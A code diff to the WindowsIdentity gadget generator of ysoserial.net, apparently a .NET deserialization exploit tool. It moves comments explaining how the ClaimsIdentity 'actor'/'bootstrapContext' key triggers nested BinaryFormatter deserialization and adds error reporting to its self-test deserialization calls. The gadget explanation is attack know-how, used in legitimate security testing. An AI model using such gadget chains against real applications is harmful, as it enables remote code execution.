@@ -1,39 +1,30 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.IO;
 using System.Runtime.Serialization;
 using System.Security.Principal;
-using System.Xml;
-using Newtonsoft.Json;
-using System.Runtime.Serialization.Formatters.Soap;
 using ysoserial.Helpers;
 
 namespace ysoserial.Generators
 {
     class WindowsIdentityGenerator : GenericGenerator
     {
-        public override string Description()
-        {
-            return "WindowsIdentity gadget";
+        // Bridge from BinaryFormatter constructor/callback to BinaryFormatter
+        // Usefule for Json.Net since it invokes ISerializable callbacks during deserialization
 
-            // Bridge from BinaryFormatter constructor/callback to BinaryFormatter
-            // Usefule for Json.Net since it invokes ISerializable callbacks during deserialization
+        // WindowsIdentity extends ClaimsIdentity
+        // https://referencesource.microsoft.com/#mscorlib/system/security/claims/ClaimsIdentity.cs,60342e51e4acc828,references
 
-            // WindowsIdentity extends ClaimsIdentity
-            // https://referencesource.microsoft.com/#mscorlib/system/security/claims/ClaimsIdentity.cs,60342e51e4acc828,references
+        // System.Security.ClaimsIdentity.bootstrapContext is an SerializationInfo key (BootstrapContextKey)
+        // added during serialization with binary formatter serialized Claims
 
-            // System.Security.ClaimsIdentity.bootstrapContext is an SerializationInfo key (BootstrapContextKey)
-            // added during serialization with binary formatter serialized Claims
-
-            // protected ClaimsIdentity(SerializationInfo info, StreamingContext context)
-            // private void Deserialize
-            // using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(info.GetString(BootstrapContextKey))))
-            //     m_bootstrapContext = bf.Deserialize(ms, null, false);
-            //
-            // Changed by Soroush Dalili: 
-            // "actor" has the same effect as "bootstrapContext" but is shorter. 
-            // Therefore, all ".bootstrapContext" has been replaced with ".actor" it has been replaced in this plugin
-        }
+        // protected ClaimsIdentity(SerializationInfo info, StreamingContext context)
+        // private void Deserialize
+        // using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(info.GetString(BootstrapContextKey))))
+        //     m_bootstrapContext = bf.Deserialize(ms, null, false);
+        //
+        // Changed by Soroush Dalili: 
+        // "actor" has the same effect as "bootstrapContext" but is shorter. 
+        // Therefore, all ".bootstrapContext" has been replaced with ".actor" it has been replaced in this plugin
 
         public override List<string> SupportedFormatters()
         {
@@ -115,8 +106,9 @@ namespace ysoserial.Generators
                     {
                         SerializersHelper.JsonNet_deserialize(payload);
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
@@ -145,10 +137,11 @@ namespace ysoserial.Generators
                 {
                     try
                     {
-                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
+                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
@@ -179,8 +172,9 @@ namespace ysoserial.Generators
                     {
                         SerializersHelper.NetDataContractSerializer_deserialize(payload);
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
@@ -213,8 +207,9 @@ namespace ysoserial.Generators
                     {
                         SerializersHelper.SoapFormatter_deserialize(payload);
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
